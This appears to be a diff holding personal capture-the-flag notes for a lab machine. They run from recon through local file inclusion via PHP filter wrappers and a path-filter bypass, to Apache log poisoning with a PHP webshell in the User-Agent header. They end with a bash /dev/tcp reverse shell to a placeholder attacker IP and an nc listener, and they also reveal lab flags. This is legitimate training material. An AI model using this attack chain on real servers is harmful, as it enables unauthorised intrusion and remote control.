@@ -1,1 +1,152 @@
+nmap:
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+dirb:
+
+
+in /flags/
+-> rick rolled >:(
+
+
+
+
+in index.html
+-> support@mafialive.thm
+-> find a diffrent hostname
+-> mafialive.thm
+
+
+
+
+
+nano /etc/hosts
+-> IP     mafialive.thm
+
+
+
+in http://mafialive.thm
+-> thm{f0und_th3_r1ght_h0st_n4m3} 
+-> :D
+-> /robots.txt
+  --> User-agent: *
+      Disallow: /test.php
+
+
+
+
+in http://mafialive.thm/test.php
+-> click button
+  --> /test.php?view=/var/www/html/development_testing/mrrobot.php
+      --> Control is an illusion 
+  --> /test.php?view=/test.php?view=sadas
+      --> Sorry, Thats not allowed 
+  --> /test.php?view=/var/www/html/development_testing/./test.php
+      --> no errors --> lfi is available
+
+lfi using php wrappers
+-> /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+   --> echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d
+       ---> <?php echo 'Control is an illusion'; ?>
+-> http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+   --> CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 
+       ---> echo $long_ass_base64 | base64 -d
+
+<!DOCTYPE HTML>
+<html> <head> <title>INCLUDE</title>
+
+    <h1>Test Page. Not to be Deployed</h1>
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+            //FLAG: thm{explo1t1ng_lf1}
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            if(isset($_GET["view"])){
+            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            } else {
+                echo 'Sorry, Thats not allowed';
+            }
+        } ?>
+    </div>
+</body>
+</html>
+
+
+
+-> lets focus on the php code
+<?php
+function containsStr($str, $substr)
+  {   return strpos($str, $substr) !== false;   }
+if (isset($_GET["view"])) {
+    if (
+        !containsStr($_GET["view"], "../..") &&
+        containsStr($_GET["view"], "/var/www/html/development_testing"))
+    {
+        include $_GET["view"];
+    } else {
+        echo "Sorry, Thats not allowed";
+    }
+}
+?>
+
+-> it will check if the value of 'view' both
+   --> not contains '../..'
+   --> contains '/var/www/html/development_testing'
+-> using that logic we can easily use lfi as follows:
+   --> /test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
+-> if we pass the filter of 'view' value it will include the page.
+-> now that we know the deal with the back-end login & know how to easily perform
+   lfi we can use more advanced techniques like log poisoning to gain reverse shell ...
+
+
+
+
+
+
+
+
+
+
+rev shell via log poisoning
+-> /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
+-> burpsuite
+   --> 
+    GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1
+    Host: mafialive.thm
+    User-Agent: <?php system($_GET['c']); ?>
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    DNT: 1
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+
+   --> see the diffrence between the logs (1st is via firefox, 2nd is the injected php via user-agent)
+   --> use ctrl + u to see it more formatted
+10.8.56.244 - - [11/Mar/2024:05:22:53 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 200 642 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+10.8.56.244 - - [11/Mar/2024:05:23:44 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 200 652 "-" ""
+
+
+ -> if we didnt get the php back it means the injection was succesffull
+ -> /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log?c=ls
+   --> 
+10.8.56.244 - - [11/Mar/2024:05:23:44 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 200 652 "-" "index.html
+mrrobot.php
+robots.txt
+test.php
+"
+10.8.56.244 - - [11/Mar/2024:05:23:44 +0530] "GET /favicon.ico HTTP/1.1" 404 455 "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+ -> seeing the code reflected back (via c param)
+ -> note : we must use & instead of ? in the url because we have 2 parameters (view and now c)
+ -> /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log?c=bash -c 'sh -i >& /dev/tcp/kali_IP/1234 0>&1'
+ -> nc -lvnp 1234
+ -> :D
+
+
+
 
